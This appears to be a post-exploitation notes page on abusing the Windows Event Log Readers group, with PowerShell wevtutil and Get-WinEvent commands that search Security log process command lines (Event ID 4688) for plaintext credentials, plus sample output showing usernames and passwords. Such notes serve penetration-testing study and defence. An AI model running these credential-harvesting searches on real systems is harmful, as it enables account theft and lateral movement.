---
title: Event Log Readers
date: 2026-03-06 11:26:19
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Groups
tags:
  - wevtutil
---

> ➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.

#### Searching Security Logs with `wevtutil`

> ➜ The `wevtutil` utility can be used to query the Security event log and search for commands that contain user credentials :

```powershell
PS C:\Users\logger> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!
        Process Command Line:   net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!
        Process Command Line:   net  use T: \\fs01\backups /user:tim MyStr0P@sword
```

#### Searching Security Logs with `Get-WinEvent`

> ➜ Process creation events are recorded under `Event ID 4688 (A new process has been created)`. Filtering for this event ID can help identify commands that include user credentials.

```powershell
PS C:\Users\logger> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
cmdkey  /add:WEB01 /user:amanda /pass:Pasw0d!
net  use Z: \\DB01\scripts /user:mary W1nter_gum_2021!
net  use T: \\fs01\backups /user:tim MyStr0P@sword
```
